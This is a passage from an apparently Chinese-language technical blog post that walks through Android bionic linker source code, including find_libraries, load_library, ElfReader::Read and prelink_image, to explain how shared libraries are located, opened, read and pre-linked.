CallConstructors is // called again with the libc soinfo. If it doesn't trigger the early- // out above, the libc constructor will be called again (recursively!). constructors_called = true; // 在共享链接库中会忽略 DT_PREINIT_ARRAY if (!is_main_executable() &amp;&amp; preinit_array_ != nullptr) &#123; // The GNU dynamic linker silently ignores these, but we warn the developer. PRINT(\"\\\"%s\\\": ignoring DT_PREINIT_ARRAY in shared library!\", get_realpath()); &#125; get_children().for_each([] (soinfo* si) &#123; si->call_constructors(); &#125;); if (!is_linker()) &#123; bionic_trace_begin((std::string(\"calling constructors: \") + get_realpath()).c_str()); &#125; // DT_INIT should be called before DT_INIT_ARRAY if both are present. // 首先加载 init, 在 so 中的函数名一般为 init_proc, 然后加载 init_array 中的函数 call_function(\"DT_INIT\", init_func_, get_realpath()); call_array(\"DT_INIT_ARRAY\", init_array_, init_array_count_, false, get_realpath()); if (!is_linker()) &#123; bionic_trace_end(); &#125;&#125;值得注意的是，在共享链接库中 pre_initarray 会被忽略掉，它在 call_pre_init_constructors 中，但假如你用 ndk-build 编译一个可以在 android 上执行的可执行文件，那么这个预初始化函数就不会被忽略啦 //platform\\bionic\\linker\\linker_soinfo.cppvoid soinfo::call_pre_init_constructors() &#123; if (g_is_ldd) return; // DT_PREINIT_ARRAY functions are called before any other constructors for executables, // but ignored in a shared library. call_array(\"DT_PREINIT_ARRAY\", preinit_array_, preinit_array_count_, false, get_realpath());&#125;# find_library 接下来在 find_library 中调用了 find_libraries //android-platform\\bionic\\linker\\linker.cppstatic soinfo* find_library(android_namespace_t* ns, const char* name, int rtld_flags, const android_dlextinfo* extinfo, soinfo* needed_by) &#123; soinfo* si = nullptr; // 如果 name 是空的，则为 si 赋值为 somain //somain: main process, always the one after libdl_info if (name == nullptr) &#123; si = solist_get_somain();// 这个函数将会返回 somain; &#125; else if (!find_libraries(ns, needed_by, &amp;name, 1, &amp;si, nullptr, 0, rtld_flags, extinfo, false /* add_as_children */)) &#123; if (si != nullptr) &#123; soinfo_unload(si); &#125; return nullptr; &#125; // 加载 so 成功，so 的引用次数 + 1, 对应了 JavaVMExt::LoadNativeLibrary 中 //so 加载时 这一部分的注释↓ /* Below we dlopen but there is no paired dlclose, this would be necessary if we supported class unloading. Libraries will only be unloaded when the reference count (incremented by dlopen) becomes zero from dlclose. */ si->increment_ref_count(); return si;&#125;# find_libraries 分析了这么久等的就是这个函数！ 函数声明: //android-platform\\bionic\\linker\\linker.cpp/* ns 加载的命名空间 = 调用者的命名空间 start_with 调用者的 soinfo library_names 所有加载库名称 library_names_count 加载库数量 soinfos 保存加载完成的 soinfo ld_preloads 保存预加载库，没有可以为 null ld_preloads_count 预加载库数量 extinfo Android 调用附带 add_as_children 是否作为 start_with 的子库 search_linked_namespaces 查询链接命名空间 namespaces 链接命名空间*/bool find_libraries(android_namespace_t* ns, soinfo* start_with, const char* const library_names[], size_t library_names_count, soinfo* soinfos[], std::vector&lt;soinfo*>* ld_preloads, size_t ld_preloads_count, int rtld_flags, const android_dlextinfo* extinfo, bool add_as_children, std::vector&lt;android_namespace_t*>* namespaces)这个函数可以分为七个部分进行分析 # 准备阶段 这一部分将待加载的 so 添加到 LoadTaskList 加载任务队列中 // Step 0: prepare.std::unordered_map&lt;const soinfo*, ElfReader> readers_map;LoadTaskList load_tasks;// 可以同时加载多个 so, 但从 find_library 传入的参数看来，library_names_count// 的值为 1, 也就是说仅加载一个目标 path 的 sofor (size_t i = 0; i &lt; library_names_count; ++i) &#123; const char* name = library_names[i]; // 将这个 so push 到 load_tasks 的任务中 load_tasks.push_back(LoadTask::create(name, start_with, ns, &amp;readers_map));&#125;// If soinfos array is null allocate one on stack.// The array is needed in case of failure; for example// when library_names[] = &#123;libone.so, libtwo.so&#125; and libone.so// is loaded correctly but libtwo.so failed for some reason.// In this case libone.so should be unloaded on return.// See also implementation of failure_guard below.// 为 soinfos 分配空间if (soinfos == nullptr) &#123; size_t soinfos_size = sizeof(soinfo*)*library_names_count; soinfos = reinterpret_cast&lt;soinfo**>(alloca(soinfos_size)); memset(soinfos, 0, soinfos_size);&#125;// list of libraries to link - see step 2.size_t soinfos_count = 0;auto scope_guard = android::base::make_scope_guard([&amp;]() &#123; for (LoadTask* t : load_tasks) &#123; LoadTask::deleter(t); &#125;&#125;);ZipArchiveCache zip_archive_cache;soinfo_list_t new_global_group_members;# 寻找依赖库，添加到待加载队列 将待加载的 so 的依赖库添加到 load_tasks 队列中，此时并不会加载依赖库 // Step 1: expand the list of load_tasks to include// all DT_NEEDED libraries (do not load them just yet)for (size_t i = 0; i&lt;load_tasks.size(); ++i) &#123; LoadTask* task = load_tasks[i]; soinfo* needed_by = task->get_needed_by(); bool is_dt_needed = needed_by != nullptr &amp;&amp; (needed_by != start_with || add_as_children); task->set_extinfo(is_dt_needed ? nullptr : extinfo); task->set_dt_needed(is_dt_needed); LD_LOG(kLogDlopen, \"find_libraries(ns=%s): task=%s, is_dt_needed=%d\", ns->get_name(), task->get_name(), is_dt_needed); // Note: start from the namespace that is stored in the LoadTask. This namespace // is different from the current namespace when the LoadTask is for a transitive // dependency and the lib that created the LoadTask is not found in the // current namespace but in one of the linked namespace. if (!find_library_internal(const_cast&lt;android_namespace_t*>(task->get_start_from()), task, &amp;zip_archive_cache, &amp;load_tasks, rtld_flags)) &#123; return false; &#125; soinfo* si = task->get_soinfo(); if (is_dt_needed) &#123; needed_by->add_child(si); &#125; // When ld_preloads is not null, the first // ld_preloads_count libs are in fact ld_preloads. bool is_ld_preload = false; if (ld_preloads != nullptr &amp;&amp; soinfos_count &lt; ld_preloads_count) &#123; ld_preloads->push_back(si); is_ld_preload = true; &#125; if (soinfos_count &lt; library_names_count) &#123; soinfos[soinfos_count++] = si; &#125; // Add the new global group members to all initial namespaces. Do this secondary namespace setup // at the same time that libraries are added to their primary namespace so that the order of // global group members is the same in the every namespace. Only add a library to a namespace // once, even if it appears multiple times in the dependency graph. if (is_ld_preload || (si->get_dt_flags_1() &amp; DF_1_GLOBAL) != 0) &#123; if (!si->is_linked() &amp;&amp; namespaces != nullptr &amp;&amp; !new_global_group_members.contains(si)) &#123; new_global_group_members.push_back(si); for (auto linked_ns : *namespaces) &#123; if (si->get_primary_namespace() != linked_ns) &#123; linked_ns->add_soinfo(si); si->add_secondary_namespace(linked_ns); &#125; &#125; &#125; &#125;&#125;这一步要做的是调用 find_library_internal 获取到这个 so 的依赖库，那么什么是 so 的依赖库呢？我们拿 ida 随便反编译一个 so, Needed Library 开头的就是这一个 so 的所有依赖库 # find_library_internal 这里做了四次对于待加载 so 的依赖库的寻找 调用 find_loaded_library_by_soname 这个库有没有被加载过了？加载过那么我找都不用找了直接返回寻找结果 正常使用 load_library 找依赖库 正常寻找找不到，那这个库是不是已经预置在系统库里面了？试试到全局命名空间 g_default_namespace 里面找找 前三种方式都失败了？启动终极解决方案，到共享命名空间 linked namespace 找这个 so 的依赖库，还没找到那就是真的找不到了 //android-platform\\bionic\\linker\\linker.cppstatic bool find_library_internal(android_namespace_t* ns, LoadTask* task, ZipArchiveCache* zip_archive_cache, LoadTaskList* load_tasks, int rtld_flags) &#123; soinfo* candidate; // 如果这个 so 已经被加载过了，就直接给 task 设置完 soinfo 后返回 if (find_loaded_library_by_soname(ns, task->get_name(), true /* search_linked_namespaces */, &amp;candidate)) &#123; LD_LOG(kLogDlopen, \"find_library_internal(ns=%s, task=%s): Already loaded (by soname): %s\", ns->get_name(), task->get_name(), candidate->get_realpath()); task->set_soinfo(candidate); return true; &#125; // Library might still be loaded, the accurate detection // of this fact is done by load_library. TRACE(\"[ \\\"%s\\\" find_loaded_library_by_soname failed (*candidate=%s@%p). Trying harder... ]\", task->get_name(), candidate == nullptr ? \"n/a\" : candidate->get_realpath(), candidate); // 关键函数，用来寻找依赖库 if (load_library(ns, task, zip_archive_cache, load_tasks, rtld_flags, true /* search_linked_namespaces */)) &#123; return true; &#125; // TODO(dimitry): workaround for http://b/26394120 (the exempt-list) //exempt lib, 即已经预置在系统库中的 so, 例如 libcrypto.so,libssl.so // 等等比较著名的库，假如发现是这些库的话，用默认命名空间获取 soinfo if (ns->is_exempt_list_enabled() &amp;&amp; is_exempt_lib(ns, task->get_name(), task->get_needed_by())) &#123; // For the libs in the exempt-list, switch to the default namespace and then // try the load again from there. The library could be loaded from the // default namespace or from another namespace (e.g. runtime) that is linked // from the default namespace. LD_LOG(kLogDlopen, \"find_library_internal(ns=%s, task=%s): Exempt system library - trying namespace %s\", ns->get_name(), task->get_name(), g_default_namespace.get_name()); ns = &amp;g_default_namespace; if (load_library(ns, task, zip_archive_cache, load_tasks, rtld_flags, true /* search_linked_namespaces */)) &#123; return true; &#125; &#125; // END OF WORKAROUND // if a library was not found - look into linked namespaces // preserve current dlerror in the case it fails. // 假如找遍了自己的命名空间还是没找到这个 so 的依赖库的话，就去共享命名空间 (linked namespace) // 里面去找找看 DlErrorRestorer dlerror_restorer; LD_LOG(kLogDlopen, \"find_library_internal(ns=%s, task=%s): Trying %zu linked namespaces\", ns->get_name(), task->get_name(), ns->linked_namespaces().size()); for (auto&amp; linked_namespace : ns->linked_namespaces()) &#123; if (find_library_in_linked_namespace(linked_namespace, task)) &#123; // Library is already loaded. if (task->get_soinfo() != nullptr) &#123; // n.b. This code path runs when find_library_in_linked_namespace found an already-loaded // library by soname. That should only be possible with a exempt-list lookup, where we // switch the namespace, because otherwise, find_library_in_linked_namespace is duplicating // the soname scan done in this function's first call to find_loaded_library_by_soname. return true; &#125; if (load_library(linked_namespace.linked_namespace(), task, zip_archive_cache, load_tasks, rtld_flags, false /* search_linked_namespaces */)) &#123; LD_LOG(kLogDlopen, \"find_library_internal(ns=%s, task=%s): Found in linked namespace %s\", ns->get_name(), task->get_name(), linked_namespace.linked_namespace()->get_name()); return true; &#125; &#125; &#125; return false;&#125;# load_library 函数声明: //android-platform\\bionic\\linker\\linker.cppstatic bool load_library(android_namespace_t* ns, LoadTask* task, ZipArchiveCache* zip_archive_cache, LoadTaskList* load_tasks, int rtld_flags, bool search_linked_namespaces);在这个函数中，首先判断 extinfo-&gt;flags 是否是 ANDROID_DLEXT_USE_LIBRARY_FD , 如果同时有 ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET , 标志在 Android 官网的解释如下 那这样就方便了，假如已经有了这个 library 的 fd 文件描述符，那直接拿过来用就可以了 但是我们待加载的 so 的 extinfo-&gt;flags 已经在 android::OpenNativeLibrary 中被定义为 ANDROID_DLEXT_USE_NAMESPACE 了，这个标志的含义在上图中也有给出，所以很遗憾，这个 if 语句中的代码并不会被执行 那么为什么要特意在此处加入这个 if 语句呢？ 我的理解是为了提高运行的效率，有一些底层的库已经打开过，加载过了，那么就完全没有必要再打开，搜索一次，直接把 library 的 fd 文件描述符拿过来用就可以了 const char* name = task->get_name();soinfo* needed_by = task->get_needed_by();const android_dlextinfo* extinfo = task->get_extinfo();// 如果 extinfo->flags 的标记是 ANDROID_DLEXT_USE_LIBRARY_FD, 则直接通过//fd 文件描述符来打开if (extinfo != nullptr &amp;&amp; (extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD) != 0) &#123; off64_t file_offset = 0; if ((extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET) != 0) &#123; file_offset = extinfo->library_fd_offset; &#125; std::string realpath; if (!realpath_fd(extinfo->library_fd, &amp;realpath)) &#123; if (!is_first_stage_init()) &#123; PRINT( \"warning: unable to get realpath for the library \\\"%s\\\" by extinfo->library_fd. \" \"Will use given name.\", name); &#125; realpath = name; &#125; task->set_fd(extinfo->library_fd, false); task->set_file_offset(file_offset); return load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces);&#125;之后，我们千辛万苦终于看到了这对于待加载的 so 的第一个操作，调用 open_library 打开它 // Open the file.off64_t file_offset;std::string realpath;int fd = open_library(ns, zip_archive_cache, name, needed_by, &amp;file_offset, &amp;realpath);// 如果打开 so 失败，寻找失败原因if (fd == -1) &#123; if (task->is_dt_needed()) &#123; if (needed_by->is_main_executable()) &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found: needed by main executable\", name); &#125; else &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found: needed by %s in namespace %s\", name, needed_by->get_realpath(), task->get_start_from()->get_name()); &#125; &#125; else &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found\", name); &#125; return false;&#125;//set fd and file_offsettask->set_fd(fd, true);task->set_file_offset(file_offset);我们知道 System.load 需要指定待加载的 so 的绝对路径，这在 open_library 中便符合第一个 if 语句，所以接下来将会调用 open_library_at_path static int open_library(android_namespace_t* ns, ZipArchiveCache* zip_archive_cache, const char* name, soinfo *needed_by, off64_t* file_offset, std::string* realpath) &#123; TRACE(\"[ opening %s from namespace %s ]\", name, ns->get_name()); // If the name contains a slash, we should attempt to open it directly and not search the paths. // 有斜杠，说明是绝对路径打开的 if (strchr(name, '/') != nullptr) &#123; return open_library_at_path(zip_archive_cache, name, file_offset, realpath); &#125; // LD_LIBRARY_PATH has the highest priority. We don't have to check accessibility when searching // the namespace's path lists, because anything found on a namespace path list should always be // accessible. int fd = open_library_on_paths(zip_archive_cache, name, file_offset, ns->get_ld_library_paths(), realpath); // Try the DT_RUNPATH, and verify that the library is accessible. if (fd == -1 &amp;&amp; needed_by != nullptr) &#123; fd = open_library_on_paths(zip_archive_cache, name, file_offset, needed_by->get_dt_runpath(), realpath); if (fd != -1 &amp;&amp; !ns->is_accessible(*realpath)) &#123; close(fd); fd = -1; &#125; &#125; // Finally search the namespace's main search path list. if (fd == -1) &#123; fd = open_library_on_paths(zip_archive_cache, name, file_offset, ns->get_default_library_paths(), realpath); &#125; return fd;&#125;在 open_library_at_path 中才算是真正的使用 open 函数打开了这个 so, 并返回文件描述符 fd , 传入的两个标志的含义分别为 O_RDONLY 表示以只读方式打开文件。 O_CLOEXEC 表示在 exec 族函数 (execl, execlp, execle, execv, execvp, execvpe) 调用后，将自动关闭文件描述符 static int open_library_at_path(ZipArchiveCache* zip_archive_cache, const char* path, off64_t* file_offset, std::string* realpath) &#123; int fd = -1; // 如果路径中包含 \"!/\", 则通过 zipfile 打开库 if (strstr(path, kZipFileSeparator) != nullptr) &#123; fd = open_library_in_zipfile(zip_archive_cache, path, file_offset, realpath); &#125; if (fd == -1) &#123; fd = TEMP_FAILURE_RETRY(open(path, O_RDONLY | O_CLOEXEC)); if (fd != -1) &#123; *file_offset = 0; if (!realpath_fd(fd, realpath)) &#123; if (!is_first_stage_init()) &#123; PRINT(\"warning: unable to get realpath for the library \\\"%s\\\". Will use given path.\", path); &#125; *realpath = path; &#125; &#125; &#125; return fd;&#125;成功的打开了这个 so 之后，那就要开始解析这个 so 咯，看看 load_library 最终 return 的啥？竟然还是 load_library ! 不过细看第三个参数，怎么感觉类型不是 ZipArchiveCache* 呢 return load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces);找找函数的声明，原来 load_library 还有一个重载函数，它的第三个参数的类型就是 LoadTaskList* 此 load_library 函数的完整代码如下 //android-platform\\bionic\\linker\\linker.cppstatic bool load_library(android_namespace_t* ns, LoadTask* task, ZipArchiveCache* zip_archive_cache, LoadTaskList* load_tasks, int rtld_flags, bool search_linked_namespaces) &#123; const char* name = task->get_name(); soinfo* needed_by = task->get_needed_by(); const android_dlextinfo* extinfo = task->get_extinfo(); // 如果 extinfo->flags 的标记是 ANDROID_DLEXT_USE_LIBRARY_FD, 则直接通过 //fd 文件描述符来打开 if (extinfo != nullptr &amp;&amp; (extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD) != 0) &#123; off64_t file_offset = 0; if ((extinfo->flags &amp; ANDROID_DLEXT_USE_LIBRARY_FD_OFFSET) != 0) &#123; file_offset = extinfo->library_fd_offset; &#125; std::string realpath; if (!realpath_fd(extinfo->library_fd, &amp;realpath)) &#123; if (!is_first_stage_init()) &#123; PRINT( \"warning: unable to get realpath for the library \\\"%s\\\" by extinfo->library_fd. \" \"Will use given name.\", name); &#125; realpath = name; &#125; task->set_fd(extinfo->library_fd, false); task->set_file_offset(file_offset); return load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces); &#125; LD_LOG(kLogDlopen, \"load_library(ns=%s, task=%s, flags=0x%x, search_linked_namespaces=%d): calling \" \"open_library\", ns->get_name(), name, rtld_flags, search_linked_namespaces); // Open the file. off64_t file_offset; std::string realpath; int fd = open_library(ns, zip_archive_cache, name, needed_by, &amp;file_offset, &amp;realpath); // 如果打开 so 失败，寻找失败原因 if (fd == -1) &#123; if (task->is_dt_needed()) &#123; if (needed_by->is_main_executable()) &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found: needed by main executable\", name); &#125; else &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found: needed by %s in namespace %s\", name, needed_by->get_realpath(), task->get_start_from()->get_name()); &#125; &#125; else &#123; DL_OPEN_ERR(\"library \\\"%s\\\" not found\", name); &#125; return false; &#125; //set fd and file_offset task->set_fd(fd, true); task->set_file_offset(file_offset); return load_library(ns, task, load_tasks, rtld_flags, realpath, search_linked_namespaces);&#125;# 重载的 load_library 函数声明: //android-platform\\bionic\\linker\\linker.cppstatic bool load_library(android_namespace_t* ns, LoadTask* task, LoadTaskList* load_tasks, int rtld_flags, const std::string&amp; realpath, bool search_linked_namespaces);这个函数的开头做了一大堆参数合法性的检查，随后终于开始解析 so 了，其关键函数为 task-&gt;read(realpath.c_str(), file_stat.st_size) soinfo* si = soinfo_alloc(ns, realpath.c_str(), &amp;file_stat, file_offset, rtld_flags);task->set_soinfo(si);// Read the ELF header and some of the segments.if (!task->read(realpath.c_str(), file_stat.st_size)) &#123; task->remove_cached_elf_reader(); task->set_soinfo(nullptr); soinfo_free(si); return false;&#125;// Find and set DT_RUNPATH, DT_SONAME, and DT_FLAGS_1.// Note that these field values are temporary and are// going to be overwritten on soinfo::prelink_image// with values from PT_LOAD segments.const ElfReader&amp; elf_reader = task->get_elf_reader();for (const ElfW(Dyn)* d = elf_reader.dynamic(); d->d_tag != DT_NULL; ++d) &#123; if (d->d_tag == DT_RUNPATH) &#123; si->set_dt_runpath(elf_reader.get_string(d->d_un.d_val)); &#125; if (d->d_tag == DT_SONAME) &#123; si->set_soname(elf_reader.get_string(d->d_un.d_val)); &#125; // We need to identify a DF_1_GLOBAL library early so we can link it to namespaces. if (d->d_tag == DT_FLAGS_1) &#123; si->set_dt_flags_1(d->d_un.d_val); &#125;&#125;for_each_dt_needed(task->get_elf_reader(), [&amp;](const char* name) &#123; LD_LOG(kLogDlopen, \"load_library(ns=%s, task=%s): Adding DT_NEEDED task: %s\", ns->get_name(), task->get_name(), name); load_tasks->push_back(LoadTask::create(name, si, ns, task->get_readers_map()));&#125;);LoadTask::read 初始化了一个 ElfReader , 随后调用 elf_reader.Read 正式开始读取 //android-platform\\bionic\\linker\\linker.cppbool read(const char* realpath, off64_t file_size) &#123; ElfReader&amp; elf_reader = get_elf_reader(); return elf_reader.Read(realpath, fd_, file_offset_, file_size);&#125;ElfReader::Read 兜兜转转了那么久，终于看到了这个亲切又熟悉的函数了！！ 关于这个函数的更多分析请参考 ELF 结构分析及 ElfReader //android-platform\\bionic\\linker\\linker_phdr.cppbool ElfReader::Read(const char* name, int fd, off64_t file_offset, off64_t file_size) &#123; if (did_read_) &#123; return true; &#125; name_ = name; fd_ = fd; file_offset_ = file_offset; file_size_ = file_size; if (ReadElfHeader() &amp;&amp; VerifyElfHeader() &amp;&amp; ReadProgramHeaders() &amp;&amp; ReadSectionHeaders() &amp;&amp; ReadDynamicSection()) &#123; did_read_ = true; &#125; return did_read_;&#125; 在获取到待加载的 so 的各个段的结构之后，接下来就是解析 .dynamic 中保存的符号 //android-platform\\bionic\\linker\\linker.cpp// Find and set DT_RUNPATH, DT_SONAME, and DT_FLAGS_1.// Note that these field values are temporary and are// going to be overwritten on soinfo::prelink_image// with values from PT_LOAD segments.const ElfReader&amp; elf_reader = task->get_elf_reader();for (const ElfW(Dyn)* d = elf_reader.dynamic(); d->d_tag != DT_NULL; ++d) &#123; if (d->d_tag == DT_RUNPATH) &#123; si->set_dt_runpath(elf_reader.get_string(d->d_un.d_val)); &#125; if (d->d_tag == DT_SONAME) &#123; si->set_soname(elf_reader.get_string(d->d_un.d_val)); &#125; // We need to identify a DF_1_GLOBAL library early so we can link it to namespaces. if (d->d_tag == DT_FLAGS_1) &#123; si->set_dt_flags_1(d->d_un.d_val); &#125;&#125;之后找到待加载的 so 的依赖库，这里有一个模板函数 for_each_dt_needed , 找到 .dynamic 中所有带有 DT_NEEDED 标志的字符串，这些字符串的名称就是这个 so 所需要的依赖库，然后将它们添加到 load_tasks 队列中 //android-platform\\bionic\\linker\\linker.cppfor_each_dt_needed(task->get_elf_reader(), [&amp;](const char* name) &#123; LD_LOG(kLogDlopen, \"load_library(ns=%s, task=%s): Adding DT_NEEDED task: %s\", ns->get_name(), task->get_name(), name); load_tasks->push_back(LoadTask::create(name, si, ns, task->get_readers_map()));&#125;);//android-platform\\bionic\\linker\\linker_soinfo.htemplate&lt;typename F>void for_each_dt_needed(const soinfo* si, F action) &#123; for (const ElfW(Dyn)* d = si->dynamic; d->d_tag != DT_NULL; ++d) &#123; if (d->d_tag == DT_NEEDED) &#123; action(fix_dt_needed(si->get_string(d->d_un.d_val), si->get_realpath())); &#125; &#125;&#125;# 乱序加载库 乱序加载的原因如下，看上去是为了抵御攻击 ld.so(1) on ELF platforms now loads libraries in a random order for greater resistance to attacks // Step 2: Load libraries in random order (see b/24047022)LoadTaskList load_list;for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); auto pred = [&amp;](const LoadTask* t) &#123; return t->get_soinfo() == si; &#125;; if (!si->is_linked() &amp;&amp; std::find_if(load_list.begin(), load_list.end(), pred) == load_list.end() ) &#123; load_list.push_back(task); &#125;&#125;bool reserved_address_recursive = false;if (extinfo) &#123; reserved_address_recursive = extinfo->flags &amp; ANDROID_DLEXT_RESERVED_ADDRESS_RECURSIVE;&#125;if (!reserved_address_recursive) &#123; // Shuffle the load order in the normal case, but not if we are loading all // the libraries to a reserved address range. shuffle(&amp;load_list);&#125;// Set up address space parameters.address_space_params extinfo_params, default_params;size_t relro_fd_offset = 0;if (extinfo) &#123; if (extinfo->flags &amp; ANDROID_DLEXT_RESERVED_ADDRESS) &#123; extinfo_params.start_addr = extinfo->reserved_addr; extinfo_params.reserved_size = extinfo->reserved_size; extinfo_params.must_use_address = true; &#125; else if (extinfo->flags &amp; ANDROID_DLEXT_RESERVED_ADDRESS_HINT) &#123; extinfo_params.start_addr = extinfo->reserved_addr; extinfo_params.reserved_size = extinfo->reserved_size; &#125;&#125;for (auto&amp;&amp; task : load_list) &#123; address_space_params* address_space = (reserved_address_recursive || !task->is_dt_needed()) ? &amp;extinfo_params : &amp;default_params; // 加载所有的库，包括待加载的 so if (!task->load(address_space)) &#123; return false; &#125;&#125;load 函数就是将 ELF 的相关结构的值赋值给 si_ , 其中我们可以看到比较重要的字段有 phdr_count , loaded_phdr bool load(address_space_params* address_space) &#123; ElfReader&amp; elf_reader = get_elf_reader(); if (!elf_reader.Load(address_space)) &#123; return false; &#125; si_->base = elf_reader.load_start(); si_->size = elf_reader.load_size(); si_->set_mapped_by_caller(elf_reader.is_mapped_by_caller()); si_->load_bias = elf_reader.load_bias(); si_->phnum = elf_reader.phdr_count(); si_->phdr = elf_reader.loaded_phdr(); si_->set_gap_start(elf_reader.gap_start()); si_->set_gap_size(elf_reader.gap_size()); return true;&#125;# 预链接解析所有依赖库 // Step 3: pre-link all DT_NEEDED libraries in breadth first order. for (auto&amp;&amp; task : load_tasks) &#123; soinfo* si = task->get_soinfo(); if (!si->is_linked() &amp;&amp; !si->prelink_image()) &#123; return false; &#125; register_soinfo_tls(si); &#125;这里我们看到调用了 prelink_image 来预链接依赖库，主要是遍历 .dynamic 节，来提取必要的信息例如 strtab_ , symtab_ , plt_rela_ , init_array_ 等等各种必要的信息 bool soinfo::prelink_image() &#123; if (flags_ &amp; FLAG_PRELINKED) return true; /* Extract dynamic section */ ElfW(Word) dynamic_flags = 0; // 提取动态节（dynamic section） phdr_table_get_dynamic_section(phdr, phnum, load_bias, &amp;dynamic, &amp;dynamic_flags); /* We can't log anything until the linker is relocated */ bool relocating_linker = (flags_ &amp; FLAG_LINKER) != 0; if (!relocating_linker) &#123; INFO(\"[ Linking \\\"%s\\\" ]\", get_realpath()); DEBUG(\"si->base = %p si->flags = 0x%08x\", reinterpret_cast&lt;void*>(base), flags_); &#125; if (dynamic == nullptr) &#123; if (!relocating_linker) &#123; DL_ERR(\"missing PT_DYNAMIC in \\\"%s\\\"\", get_realpath()); &#125; return false; &#125; else &#123; if (!relocating_linker) &#123; DEBUG(\"dynamic = %p\", dynamic); &#125; &#125;#if defined(__arm__) (void) phdr_table_get_arm_exidx(phdr, phnum, load_bias, &amp;ARM_exidx, &amp;ARM_exidx_count);#endif TlsSegment tls_segment; if (__bionic_get_tls_segment(phdr, phnum, load_bias, &amp;tls_segment)) &#123; if (!__bionic_check_tls_alignment(&amp;tls_segment.alignment)) &#123; if (!relocating_linker) &#123; DL_ERR(\"TLS segment alignment in \\\"%s\\\" is not a power of 2: %zu\", get_realpath(), tls_segment.alignment); &#125; return false; &#125; tls_ = std::make_unique&lt;soinfo_tls>(); tls_->segment = tls_segment; &#125; // Extract useful information from dynamic section. // Note that: \"Except for the DT_NULL element at the end of the array, // and the relative order of DT_NEEDED elements, entries may appear in any order.\" // // source: http://www.sco.com/developers/gabi/1998-04-29/ch5.dynamic.html uint32_t needed_count = 0; // 循环遍历每个动态节，并根据 d_tag 为对应节做相应的处理 for (ElfW(Dyn)* d = dynamic; d->d_tag != DT_NULL; ++d) &#123; DEBUG(\"d = %p, d[0](tag) = %p d[1](val) = %p\", d, reinterpret_cast&lt;void*>(d->d_tag), reinterpret_cast&lt;void*>(d->d_un.d_val)); switch (d->d_tag) &#123; case DT_SONAME: // this is parsed after we have strtab initialized (see below). break; case DT_HASH: nbucket_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[0]; nchain_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[1]; bucket_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr + 8); chain_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr + 8 + nbucket_ * 4); break; case DT_GNU_HASH: gnu_nbucket_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[0]; // skip symndx gnu_maskwords_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[2]; gnu_shift2_ = reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[3]; gnu_bloom_filter_ = reinterpret_cast&lt;ElfW(Addr)*>(load_bias + d->d_un.d_ptr + 16); gnu_bucket_ = reinterpret_cast&lt;uint32_t*>(gnu_bloom_filter_ + gnu_maskwords_); // amend chain for symndx = header[1] gnu_chain_ = gnu_bucket_ + gnu_nbucket_ - reinterpret_cast&lt;uint32_t*>(load_bias + d->d_un.d_ptr)[1]; if (!powerof2(gnu_maskwords_)) &#123; DL_ERR(\"invalid maskwords for gnu_hash = 0x%x, in \\\"%s\\\" expecting power to two\", gnu_maskwords_, get_realpath()); return false; &#125; --gnu_maskwords_; flags_ |= FLAG_GNU_HASH; break; case DT_STRTAB: strtab_ = reinterpret_cast&lt;const char*>(load_bias + d->d_un.d_ptr); break; case DT_STRSZ: strtab_size_ = d->d_un.d_val; break; case DT_SYMTAB: symtab_ = reinterpret_cast&lt;ElfW(Sym)*>(load_bias + d->d_un.d_ptr); break; case DT_SYMENT: if (d->d_un.d_val != sizeof(ElfW(Sym))) &#123; DL_ERR(\"invalid DT_SYMENT: %zd in \\\"%s\\\"\", static_cast&lt;size_t>(d->d_un.d_val), get_realpath()); return false; &#125; break; case DT_PLTREL:#if defined(USE_RELA) if (d->d_un.d_val != DT_RELA) &#123; DL_ERR(\"unsupported DT_PLTREL in \\\"%s\\\"; expected DT_RELA\", get_realpath()); return false; &#125;#else if (d->d_un.d_val != DT_REL) &#123; DL_ERR(\"unsupported DT_PLTREL in \\\"%s\\\"; expected DT_REL\", get_realpath()); return false; &#125;#endif break; case DT_JMPREL:#if defined(USE_RELA) plt_rela_ = reinterpret_cast&lt;ElfW(Rela)*>(load_bias + d->d_un.d_ptr);#else plt_rel_ = reinterpret_cast&lt;ElfW(Rel)*>(load_bias + d->d_un.d_ptr);#endif break; case DT_PLTRELSZ:#if defined(USE_RELA) plt_rela_count_ = d->d_un.d_val / sizeof(ElfW(Rela));#else plt_rel_count_ = d->d_un.d_val / sizeof(ElfW(Rel));#endif break; case DT_PLTGOT: // Ignored (because RTLD_LAZY is not supported). break; case DT_DEBUG: // Set the DT_DEBUG entry to the address of _r_debug for GDB // if the dynamic table is writable if ((dynamic_flags &amp; PF_W) != 0) &#123; d->d_un.d_val = reinterpret_cast&lt;uintptr_t>(&amp;_r_debug); &#125; break;#if defined(USE_RELA) case DT_RELA: rela_ = reinterpret_cast&lt;ElfW(Rela)*>(load_bias + d->d_un.d_ptr); break; case DT_RELASZ: rela_count_ = d->d_un.d_val / sizeof(ElfW(Rela)); break; case DT_ANDROID_RELA: android_relocs_ = reinterpret_cast&lt;uint8_t*>(load_bias + d->d_un.d_ptr); break; case DT_ANDROID_RELASZ: android_relocs_size_ = d->d_un.d_val; break; case DT_ANDROID_REL: DL_ERR(\"unsupported DT_ANDROID_REL in \\\"%s\\\"\", get_realpath()); return false; case DT_ANDROID_RELSZ: DL_ERR(\"unsupported DT_ANDROID_RELSZ in \\\"%s\\\"\", get_realpath()); return false; case DT_RELAENT: if 